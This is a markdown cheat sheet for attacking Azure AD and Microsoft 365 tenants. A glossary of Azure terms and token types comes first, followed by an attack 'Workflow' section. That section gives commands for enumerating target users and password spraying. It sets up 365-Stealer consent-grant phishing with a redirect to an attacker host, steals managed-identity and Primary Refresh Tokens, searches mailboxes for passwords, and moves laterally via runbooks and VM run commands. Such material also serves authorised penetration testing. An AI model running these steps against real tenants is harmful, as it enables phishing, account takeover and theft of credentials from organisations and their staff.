# Vocabulary

#### Administrative units
An administrative unit is an Azure AD resource that can be a container for users, groups, or devices. It is used to restrict permissions for a given role.

#### Azure App Service
The Azure App Service provides HTTP-based services for hosting webapplications or REST APIs.

#### Azure Blob Storage
Stores unstructered data like files, videos, audio, etc.

#### Azure Key Vault 
Azure Key Vaults are places where encrypted secrets can stored (types: key, secret, certificate).

#### Azure Resource Manager
The ARM is the Client deployment and management service for Azure used to manage the access control of resources.

#### Conditional Access Policies
Fine-grained controls for access to resources and when or where MFA is applied.

#### Core Domain
The initial domain name (Example: tenant.onmicrosoft.com)

#### Enterprise
The Enterprise represents the Azure global unique identity that a company owns and allows access to subscriptions, tenants and services.

#### Function App
The also called Azure Functions provides the possibility to run code serverless. The code execution reacts to events like processing file uploads or scheduled tasks.

#### Managed Identity
A Managed Identity is a Service Principal of a special type that may only be used with Azure resources. Managed Identities can be used to access Azure Key Vaults and storage accounts.

##### Hybrid Joined machine
Device joined to an on-prem AD and Azure AD.

#### Resource
A Resource can be an account, run-book, virtual network, application, etc.

#### Runbook
A Runbook is part of the Azure Automation service. It supports scripting languages like PowerShell or Python.

#### Storage Account
An Azure storage account can contain all sort of Azure Storage data objects, including blobs, file shares, queues, tables, and disks.

#### Subscriptions
A Subscription is a logical unit of Azure services that links to an Azure account. The Subscriptions describes how you gain access to an Azure service. Each Subscription can only trust a single directory.

#### System-Assigned Managed Identity
Once a resource has been deleted the SAMI will be deleted too.

#### Tenant
A Tenant is an instance of an Enterprise. An Enterprise can have multiple tenants (like domains in a forest).

#### UAL
Unified Audit Log aggregates logs from various services, such as Exchange Online, SharePoint Onlinet, OneDrive, Microsoft Teams and Azure AD/Entra ID.

#### User-Assigned Managed Identity
Once a resource has been deleted the UAMI won't not be deleted. UAMI can be used on multiple resources.

# Resource Based Access Control

Azure AD Objects or Principals have Roles on Scopes.

## Azure AD Object / Principal
```
User
Group
Service Principal
Managed Identity
```

## Roles
Role assignment is transitive for groups.
An explicit deny role takes precedence.

### Owner
Has full control over a resource and can also change access rights for other users.

### Contributor
Has full access to all resources without the possibility to manage access.

### Reader
Has only read access.

### User Access Administrator
Can view all resources and has the possibility to manage user access to Azure resources.

## Scope Architecture
```
Management-Groups
├── Subscriptions
│   ├── Resource-Groups
│   ├── Resource-Groups
│   │   ├── Resources (Account, Run-Book, Virtual Network, Application)
│   │   └── ...
│   └── ...
├── Subscriptions
└── ...
```

# Azure AD Connect Methods

For each Azure AD Connect method the account MSOL_<installId> is created at on-prem AD.
This user can reset the password of any user and DCsync permission on AD

### Password Hash Synchronization
Using the Password Hash Synchronization (PHS) the passwords from on-premise AD are sent to the cloud. This is using a specific service account (MSOL_<installId>) that has similar rights like DCSync. Authentication takes place on Azure AD. Password expiry in on-prem domain does not reflect to Azure AD. Additionally the user Sync_<id> is created. This uswr can reset the password of every synced user.

### Pass Through Authentication
Using the Pass Through Authentication (PTA) the passwords are kept on-premise and an on-premise agent validates the authentication.

### Active Directory Federation Services
Using the Active Directory Federation Services (ADFS) Azure AD is set as a trusted agent for federation and allows to login with on-premise credentials.

### Azure AD Directory
Each tenant has a dedicated Directory, which is used to perform identity and access managment functions.

# Token types

### Access Token
Can be used to talk to APIs and access resources. 
Tied to specific client (the application that requested the token) and a specific resource (the accessed API).
Cannot be revoked until expiry (1 hour default).

### ID Token
Used in combination of user and client.
Contains information about the user.

### Refresh Token
Issued to applications to obtain new access tokens
Can only be used by the application they were issued to, or in some cases by a group of applications.
Used to get new Access and ID tokens.
Cannot be revoked until expiry (default 90 days of inactivity).

### Primary Refresh Token
Used for Single Sign On and to obtain refresh tokens to any application.
Valid for 90 days and continuously renewed.
Can be extracted from AzureAD joined or Hybrid joined machines.


# Microsoft MFA verification options
```
Microsoft Authenticator app
OAUTH Hardware token
SMS
Voice call
```

# Security Defaults
```
Requires all users register for MFA
Block legacy authentication protocols
Require MFA during authentication when necessary
Protects privileged activities likes access to Azure AD
```

# Environment variables

## App environment using a managed identity
```
env

IDENTITY_HEADER
IDENTITY_ENDPOINT
```

## Get Access Token
* https://github.com/r1cksec/cheatsheets/blob/main/snippets/py/getAzureIdentity.py

```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

## API Resources
```
https://storage.azure.com
https://vault.azure.net
https://graph.microsoft.com
https://management.azure.com
```


# Workflow

## Verify if the target company uses Azure AD
* https://login.microsoftonline.com/getuserrealm.srf?login=<targetMail>
* https://github.com/0xZDH/o365spray

```
Check 'NameSpaceType' value:

Managed -> O365 is in use
Federated = Federated Active Directory
Unknown = Record does not exist

python3 o365spray.py --validate --domain <targetDomain>
```

## Verify Email Addresses
* https://github.com/nyxgeek/onedrive_user_enum
* https://github.com/dievus/Oh365UserFinder
* https://github.com/LMGsec/o365creeper
* https://github.com/immunIT/TeamsUserEnum

```
python3 Oh365UserFinder.py -r <emailFile> -w <output> -t <seconds>

o365creeper.py -f <emailsFile> -o <validEmailsFile>

go run userEnum.go userenum -f <userFile> -t "<authToken-eyJ..>
```

## Basic Azure Storage Url
* https://github.com/NetSPI/MicroBurst

```
https://<storageAccount>.blob.core.windows.net
https://<storageAccount>.dfs.core.windows.net
https://<storageAccount>.file.core.windows.net
https://<storageAccount>.queue.core.windows.net
https://<storageAccount>.table.core.windows.net

Get content of blob:
<storageAccount>.blob.core.windows.net/<storageName>/<blob>
<storageAccount>.blob.core.windows.net/<storageName>?restype=container&comp=list/<blob>

Invoke-EnumerateAzureBlobs -Base <tenant> defcorp
```

## Phishing (Illicit Consent Grant)
* https://github.com/AlteredSecurity/365-Stealer
* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
* https://github.com/rvrsh3ll/TokenTactics

```
Get Access Token by creating an application in the attacker tenant and send the Authorization Link to a victim.

https://portal.azure.com > Azure Active Directory > App Registrations > New registration > Choose Name
Supported Account Types: Check - 'Accounts in any organizational directory (Any Azure AD directory - Multitenant)
Choos Web from Dropdown: Web
Redirect Uri: https://<attacker365StealerRhost>/login/authorized
Register > Certificates & Secrets > New Client Secret > Add > note: Secret ID
Api Permissions > Add a permission > Microsoft Graph > Delegated permissions
Search: user.read
Check: user.read and User.ReadBasic.All > Add permissions
Overview > note: Application (Client) ID

vim yourVictims/index.php
insert: public $ipWhitelist = array(
           '127.0.0.1',
           '<ip>',

php --ini
vim php.ini
insert:
extension=sqlite3

apt install php7.4-mbstring
systemctl restart apache2
php -S <365StealerIp>:8080
pip3 install -r requirements.txt
python 365-Stealer.py --set-config
python 365-Stealer.py --run-app
```

## Authenticated User Enumeration and Password Spraying
* https://login.Microsoft.com/common/oauth2/token
* https://github.com/dafthack/MSOLSpray

```
Invoke-MSOLSpray -UserList .\<userlist>.txt -Password <password>
```

## Identify inconsistencies in Microsoft MFA deployments
* https://github.com/dafthack/MFASweep

```
Invoke-MFWSweep -Username <user>@<domain> -Password <password>
```

## Authenticated - Recon
* https://github.com/dirkjanm/ROADtools
* https://github.com/Gerenios/AADInternals
* https://github.com/nyxgeek/o365recon
* https://www.powershellgallery.com/packages/AzureAD/2.0.2.140 (Get-AzureAD)
* https://github.com/BloodHoundAD/AzureHound
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md

```
roadrecon auth -u <user>@<tenant>.onmicrosoft.com -p <password>
roadrecon gather

./o365recon.ps1 -azure

Get-AADIntTenantDomains -Domain
Invoke-AADIntReconAsOutsider -DomainName <tenant>.onmicrosoft.com

Get-AzureADTenantDetail
Get-AzureADUser -All $true | ConvertTo-Json

Invoke-Azurehound

Get-AzResource
Get-AzRoleAssignment
```

## Search mailboxes and extract contact informations
* https://github.com/dafthack/MailSniper

```
Invoke-SelfSearch -Mailbox <user>@<domain> -Terms "*password*","*secret*","*key*"

Get-GlobalAddressList -ExchHostname <rhost> -UserName <domain>\<user> -Password <password> -OutFile <outFile>
```

## Authenticated - Storage Accounts
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
* https://azure.microsoft.com/en-us/products/storage/storage-explorer

```
Get-AzStorageAccount
```

## Authenticated - Key Vaults
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az.md

```
Roles that can read content: 
Key Vault Administrator
Key Vault Certificates Officer
Key Vault Crypto Officer
Key Vault Secrets User

Get-AzKeyVault

az keyvault list
```

## Authenticated - ARM templates
* https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/overview

```
JSON file containing deployment configuration for Azure resources.
Each resource group maintains a deployment history.
Any user with permission Microsoft.Resources/deployment/read and Microsoft.Resources/subscriptions/resourceGroups/read can read the deployment history.

https://portal.azure.com > Resource Group > choose resource > Settings: Deployments 
```

## Authenticated - Dynamic Rule Memberships
* https://learn.microsoft.com/en-us/azure/active-directory/enterprise-users/groups-dynamic-membership

```
Check if you can join group by dynamic event:
https://portal.azure.com > Groups > Role > Dynamic membership rules
```

## Authenticated - User Data
* https://learn.microsoft.com/en-us/azure/virtual-machines/user-data
* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md

```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://<vm>/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

## Authenticated - Application Proxy
* https://learn.microsoft.com/en-us/azure/active-directory/app-proxy/what-is-application-proxy

```
portal.azure.com > Azure Active Directory > Enteprise applications > Application proxy
portal.azure.com > Azure Active Directory > Enteprise applications > All applications > Add filters > Is App Proxy
```

## Pass the Primary Token
* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
* https://github.com/dirkjanm/ROADtools
* https://github.com/Gerenios/AADInternals

```
Get nonce for request validation using ARM API.:

ROADToken.exe <nonce>
Get-AADIntUserPRTToken

Login using adding Token via Chrome Developer Tab:
Application > Cookies > login.microsoftonline... > Name: x-ms-RefreshTokenCredential > Value: <PrimaryRefreshToken> > HttpOnly: Check
```

## Lateral Movement - PowerShell Runbook
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az.md
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md

```
az automation account list

Import-AzAutomationRunbook -Name <runName> -Path <local\path\to\ps1> -AutomationAccountName <name> -ResourceGroupName <name> -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName <runName> -AutomationAccountName <name> -ResourceGroupName <name> -Verbose
Start-AzAutomationRunbook -RunbookName <name> -RunOn <workGroup> -AutomationAccountName <name> -ResourceGroupName <name>
```

## Lateral Movement - Run Command
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md

```
Invoke-AzVmRunCommand -VmName <name> -ResourceGroupName <name> -CommandId "<name>" -ScriptPath "<path>"
```

## Lateral Movement - Continuous Deployment
* https://learn.microsoft.com/en-us/azure/app-service/scripts/cli-continuous-deployment-github

```
Function app supports continuous deployment -> triggered when source code update is pushed.

Supportet locations:
Azure Repos
Github
Bitbucket
```

